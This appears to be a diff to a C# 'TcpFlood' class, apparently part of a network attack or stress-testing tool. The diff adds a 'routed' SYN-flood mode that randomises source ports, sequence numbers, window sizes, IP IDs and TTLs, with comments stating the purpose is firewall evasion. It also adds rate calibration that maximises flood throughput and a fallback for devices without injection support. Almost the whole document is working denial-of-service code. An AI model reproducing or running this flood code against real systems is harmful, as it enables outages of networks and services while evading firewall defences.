@@ -13,6 +13,12 @@ using System.Linq;
 
 namespace Dorothy.Models
 {
+    /// <summary>
+    /// Unified TCP flood attack with routing-aware behavior.
+    /// Automatically adapts packet structure based on routing requirements:
+    /// - Local subnet: Can use payload, fixed source port
+    /// - Routed: No payload, randomized source ports/headers for firewall evasion
+    /// </summary>
     public class TcpFlood : IDisposable
     {
         private static readonly ILogger Logger = LogManager.GetCurrentClassLogger();
@@ -21,10 +27,33 @@ namespace Dorothy.Models
         private LibPcapLiveDevice? _device;
         public event EventHandler<PacketEventArgs>? PacketSent;
 
+        /// <summary>
+        /// Whether this is a routed attack (cross-subnet). 
+        /// When true: no payload, randomized source ports/headers for firewall evasion.
+        /// When false: can use payload, fixed source port for higher throughput.
+        /// </summary>
+        public bool IsRouted { get; set; } = false;
+
+        /// <summary>
+        /// Whether to include payload in SYN packets. 
+        /// Default: false for routed (firewall-friendly), true for local (higher throughput).
+        /// </summary>
+        public bool AddPayload { get; set; } = false;
+
+        /// <summary>
+        /// Whether to randomize source ports and TCP/IP header fields.
+        /// Default: true for routed (evasive), false for local (simpler).
+        /// </summary>
+        public bool RandomizeFlows { get; set; } = false;
+
         public TcpFlood(PacketParameters parameters, CancellationToken cancellationToken)
         {
             _params = parameters;
             _cancellationToken = cancellationToken;
+            
+            // Auto-detect routing mode based on MAC address
+            // If destination MAC is gateway MAC (common pattern), assume routed
+            // This is a heuristic - explicit setting via properties takes precedence
         }
 
         protected virtual void OnPacketSent(byte[] packet, IPAddress sourceIp, IPAddress destinationIp, int port)
@@ -52,15 +81,32 @@ namespace Dorothy.Models
 
                 _device.Open(DeviceModes.Promiscuous, 1000);
 
-                if (_device is not IInjectionDevice injectionDevice)
+                // For routed attacks, we might need to use standard SendPacket instead of injection
+                // But try injection first as it's more efficient
+                IInjectionDevice? injectionDevice = _device as IInjectionDevice;
+                bool useInjection = injectionDevice != null;
+                
+                if (!useInjection && !IsRouted)
                 {
                     Logger.Error($"Device {_device.Name} does not support packet injection.");
                     throw new Exception($"Device {_device.Name} does not support packet injection.");
+                }
+                
+                if (!useInjection && IsRouted)
+                {
+                    Logger.Info($"Device {_device.Name} does not support injection, using standard SendPacket for routed attack");
                 }
 
                 var random = new Random();
                 var sourceMac = PhysicalAddress.Parse(BitConverter.ToString(_params.SourceMac).Replace("-", ""));
                 var destMac = PhysicalAddress.Parse(BitConverter.ToString(_params.DestinationMac).Replace("-", ""));
+
+                // Determine if we should use routed behavior
+                // Routed = no payload, randomized flows for firewall evasion
+                bool useRoutedBehavior = IsRouted || RandomizeFlows;
+                bool usePayload = AddPayload && !useRoutedBehavior; // Don't add payload if routed
+
+                Logger.Info($"TCP Flood mode: Routed={useRoutedBehavior}, Payload={usePayload}, RandomizeFlows={RandomizeFlows}");
 
                 var ethernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);
                 var ipPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
@@ -69,17 +115,146 @@ namespace Dorothy.Models
                     TimeToLive = _params.Ttl
                 };
 
-                var tcpPacket = new TcpPacket((ushort)_params.SourcePort, (ushort)_params.DestinationPort)
+                // Create TCP packet with appropriate configuration
+                var tcpPacket = new TcpPacket(
+                    (ushort)(RandomizeFlows ? random.Next(49152, 65536) : _params.SourcePort), 
+                    (ushort)_params.DestinationPort)
                 {
                     Flags = 0x02,  // SYN flag
-                    WindowSize = 8192,
-                    SequenceNumber = 0,
-                    PayloadData = new byte[1400] // Include payload for higher throughput
+                    WindowSize = (ushort)(RandomizeFlows ? random.Next(8192, 65536) : 8192),
+                    SequenceNumber = (uint)(RandomizeFlows ? random.Next() : 0)
                 };
-                random.NextBytes(tcpPacket.PayloadData);
+
+                // Add payload only if configured and not in routed mode
+                if (usePayload)
+                {
+                    tcpPacket.PayloadData = new byte[1400];
+                    random.NextBytes(tcpPacket.PayloadData);
+                }
+
+                // Randomize IP header fields if in routed mode
+                if (RandomizeFlows)
+                {
+                    ipPacket.Id = (ushort)random.Next(0, 65536);
+                    ipPacket.TimeToLive = (byte)random.Next(64, 128);
+                }
+
                 ipPacket.PayloadPacket = tcpPacket;
                 ethernetPacket.PayloadPacket = ipPacket;
 
+                // Get header size (no payload) for routed mode calibration
+                // Note: ethernetPacket may already have payload if usePayload is true, so we'll calculate from reference packet
+                int wireHeaderSize = 0; // Will be set during calibration
+                
+                // Calibration for routed mode
+                double maxPps = 0;
+                int payloadLength = 0;
+                int actualWireSize = wireHeaderSize;
+                long targetBytesPerSecond = _params.BytesPerSecond;
+                double userMbps = targetBytesPerSecond * 8.0 / 1_000_000;
+                
+                if (IsRouted || useRoutedBehavior)
+                {
+                    Logger.Info("Starting calibration for routed TCP mode...");
+                    
+                    // Build reference SYN packet (no payload, same MAC/IP/ports)
+                    var refTcpPacket = new TcpPacket(
+                        (ushort)(RandomizeFlows ? random.Next(49152, 65536) : _params.SourcePort),
+                        (ushort)_params.DestinationPort)
+                    {
+                        Flags = 0x02, // SYN flag
+                        WindowSize = (ushort)(RandomizeFlows ? random.Next(8192, 65536) : 8192),
+                        SequenceNumber = (uint)(RandomizeFlows ? random.Next() : 0)
+                        // No payload
+                    };
+                    
+                    var refIpPacket = new IPv4Packet(_params.SourceIp, _params.DestinationIp)
+                    {
+                        Protocol = PacketDotNet.ProtocolType.Tcp,
+                        TimeToLive = (byte)(RandomizeFlows ? random.Next(64, 128) : _params.Ttl)
+                    };
+                    
+                    if (RandomizeFlows)
+                    {
+                        refIpPacket.Id = (ushort)random.Next(0, 65536);
+                    }
+                    
+                    refIpPacket.PayloadPacket = refTcpPacket;
+                    var refEthernetPacket = new EthernetPacket(sourceMac, destMac, EthernetType.IPv4);
+                    refEthernetPacket.PayloadPacket = refIpPacket;
+                    
+                    refTcpPacket.UpdateCalculatedValues();
+                    refIpPacket.UpdateCalculatedValues();
+                    
+                    byte[] refPacket = refEthernetPacket.Bytes;
+                    int refHeaderSize = refPacket.Length;
+                    wireHeaderSize = refHeaderSize + 4; // Add FCS for wire size
+                    
+                    // Calibration: send as fast as possible for 300-500ms
+                    var calStopwatch = Stopwatch.StartNew();
+                    long calPacketsSent = 0;
+                    const int calDurationMs = 400; // 400ms calibration window
+                    
+                    Logger.Info($"Calibrating max packet rate for {calDurationMs}ms...");
+                    
+                    while (calStopwatch.ElapsedMilliseconds < calDurationMs && !_cancellationToken.IsCancellationRequested)
+                    {
+                        if (useInjection)
+                        {
+                            injectionDevice!.SendPacket(refPacket);
+                        }
+                        else
+                        {
+                            _device!.SendPacket(refPacket);
+                        }
+                        calPacketsSent++;
+                    }
+                    
+                    calStopwatch.Stop();
+                    double calElapsedSeconds = calStopwatch.ElapsedTicks / (double)Stopwatch.Frequency;
+                    maxPps = calPacketsSent / calElapsedSeconds;
+                    
+                    Logger.Info($"Calibration complete: {calPacketsSent} packets in {calElapsedSeconds:F3}s = {maxPps:F0} packets/second");
+                    
+                    // Calculate required payload size based on target Mbps and maxPps
+                    long requiredWireSize = (long)(targetBytesPerSecond / maxPps);
+                    payloadLength = (int)(requiredWireSize - wireHeaderSize);
+                    
+                    // Clamp payload length between 0 and 1400
+                    const int maxPayload = 1400;
+                    payloadLength = Math.Max(0, Math.Min(payloadLength, maxPayload));
+                    
+                    actualWireSize = wireHeaderSize + payloadLength;
+                    double effectiveMaxMbps = maxPps * actualWireSize * 8.0 / 1_000_000;
+                    
+                    if (userMbps > effectiveMaxMbps)
+                    {
+                        // Clamp to effective maximum
+                        effectiveMaxMbps = Math.Max(0.1, effectiveMaxMbps); // Ensure at least 0.1 Mbps
+                        targetBytesPerSecond = (long)(effectiveMaxMbps * 1_000_000 / 8.0);
+                        Logger.Warn($"Requested {userMbps:F2} Mbps exceeds environment capacity ({effectiveMaxMbps:F2} Mbps). Clamping to {effectiveMaxMbps:F2} Mbps.");
+                    }
+                    
+                    Logger.Info($"Routed TCP configuration: header={refHeaderSize} bytes, payload={payloadLength} bytes, wire={actualWireSize} bytes, maxPps={maxPps:F0}, effective={effectiveMaxMbps:F2} Mbps");
+                    
+                    // Update TCP packet with calculated payload
+                    if (payloadLength > 0)
+                    {
+                        tcpPacket.PayloadData = new byte[payloadLength];
+                        random.NextBytes(tcpPacket.PayloadData);
+                        tcpPacket.UpdateCalculatedValues();
+                        ipPacket.UpdateCalculatedValues();
+                        ethernetPacket.PayloadPacket = ipPacket;
+                        actualWireSize = ethernetPacket.Bytes.Length + 4; // Recalculate with payload
+                    }
+                }
+
+                // Capture variables for Task.Run closure
+                int finalWireSize = actualWireSize;
+                int finalPayloadLength = payloadLength;
+                long finalTargetBytesPerSecond = targetBytesPerSecond;
+                bool isRoutedMode = IsRouted || useRoutedBehavior;
+                
                 // Get actual packet size from the Ethernet frame (includes Ethernet header + IP + TCP + payload)
                 int totalPacketSize = ethernetPacket.Bytes.Length;
                 int batchSize = 1000; // Increased batch size
@@ -94,24 +269,47 @@ namespace Dorothy.Models
                     int actualPacketSize = 0;
                     for (int i = 0; i < batchSize; i++)
                     {
-                        random.NextBytes(bytes);
-                        tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);
+                        // Regenerate randomized fields if needed
+                        if (RandomizeFlows)
+                        {
+                            // Randomize TCP fields
+                            tcpPacket.SourcePort = (ushort)random.Next(49152, 65536);
+                            tcpPacket.SequenceNumber = (uint)random.Next();
+                            tcpPacket.WindowSize = (ushort)random.Next(8192, 65536);
+                            
+                            // Randomize IP fields
+                            ipPacket.Id = (ushort)random.Next(0, 65536);
+                            ipPacket.TimeToLive = (byte)random.Next(64, 128);
+                        }
+                        else
+                        {
+                            // Just randomize sequence number for variation
+                            random.NextBytes(bytes);
+                            tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);
+                        }
+                        
+                        // For routed mode with payload, regenerate payload data
+                        if (isRoutedMode && finalPayloadLength > 0 && tcpPacket.PayloadData != null)
+                        {
+                            random.NextBytes(tcpPacket.PayloadData);
+                        }
+                        
                         tcpPacket.UpdateCalculatedValues();
                         ipPacket.UpdateCalculatedValues();
                         packetPool[i] = ethernetPacket.Bytes;
+                        
                         // Get actual packet size from first packet
                         if (i == 0)
                         {
                             actualPacketSize = ethernetPacket.Bytes.Length;
-                            Logger.Info($"TCP packet size: {actualPacketSize} bytes, Target rate: {_params.BytesPerSecond * 8.0 / 1_000_000:F2} Mbps");
+                            Logger.Info($"TCP packet size: {actualPacketSize} bytes, Target rate: {finalTargetBytesPerSecond * 8.0 / 1_000_000:F2} Mbps");
                         }
                     }
 
                     // Use actual packet size for rate calculation (Ethernet frame includes all headers + FCS)
-                    // For pcap injection, use actual Ethernet frame size + 4 bytes FCS
-                    int wirePacketSize = actualPacketSize + 4; // Add FCS for wire size
-                    long targetBytesPerSecond = _params.BytesPerSecond;
-                    double targetMbps = targetBytesPerSecond * 8.0 / 1_000_000;
+                    // For routed mode, use the calibrated finalWireSize
+                    int wirePacketSize = isRoutedMode ? finalWireSize : (actualPacketSize + 4);
+                    double targetMbps = finalTargetBytesPerSecond * 8.0 / 1_000_000;
                     Logger.Info($"TCP packet wire size: {wirePacketSize} bytes, Target rate: {targetMbps:F2} Mbps");
                     
                     // Byte-budget rate control: track bytes sent vs time elapsed
@@ -137,7 +335,7 @@ namespace Dorothy.Models
                         {
                             // Calculate how many bytes we're "allowed" to have sent so far
                             double elapsedSeconds = stopwatch.ElapsedTicks / (double)Stopwatch.Frequency;
-                            long allowedBytes = (long)(elapsedSeconds * targetBytesPerSecond);
+                            long allowedBytes = (long)(elapsedSeconds * finalTargetBytesPerSecond);
                             
                             // If we're behind budget, send packets (small burst)
                             if (bytesSent < allowedBytes)
@@ -149,7 +347,15 @@ namespace Dorothy.Models
                                 for (int i = 0; i < packetsToSend && bytesSent < allowedBytes; i++)
                                 {
                                     var packet = packetPool[currentBatch];
-                                    injectionDevice.SendPacket(packet);
+                                    if (useInjection)
+                                    {
+                                        injectionDevice!.SendPacket(packet);
+                                    }
+                                    else
+                                    {
+                                        // Fallback for routed attacks on devices without injection support
+                                        _device!.SendPacket(packet);
+                                    }
                                     OnPacketSent(packet, _params.SourceIp, _params.DestinationIp, _params.DestinationPort);
                                     
                                     bytesSent += wirePacketSize;
@@ -162,8 +368,28 @@ namespace Dorothy.Models
                                         int regenerateCount = Math.Min(100, batchSize);
                                         for (int j = 0; j < regenerateCount; j++)
                                         {
-                                            random.NextBytes(bytes);
-                                            tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);
+                                            if (RandomizeFlows)
+                                            {
+                                                // Randomize all fields for routed/evasive mode
+                                                tcpPacket.SourcePort = (ushort)random.Next(49152, 65536);
+                                                tcpPacket.SequenceNumber = (uint)random.Next();
+                                                tcpPacket.WindowSize = (ushort)random.Next(8192, 65536);
+                                                ipPacket.Id = (ushort)random.Next(0, 65536);
+                                                ipPacket.TimeToLive = (byte)random.Next(64, 128);
+                                            }
+                                            else
+                                            {
+                                                // Just randomize sequence number
+                                                random.NextBytes(bytes);
+                                                tcpPacket.SequenceNumber = BitConverter.ToUInt32(bytes, 0);
+                                            }
+                                            
+                                            // For routed mode with payload, regenerate payload data
+                                            if (isRoutedMode && finalPayloadLength > 0 && tcpPacket.PayloadData != null)
+                                            {
+                                                random.NextBytes(tcpPacket.PayloadData);
+                                            }
+                                            
                                             tcpPacket.UpdateCalculatedValues();
                                             ipPacket.UpdateCalculatedValues();
                                             packetPool[j] = ethernetPacket.Bytes;
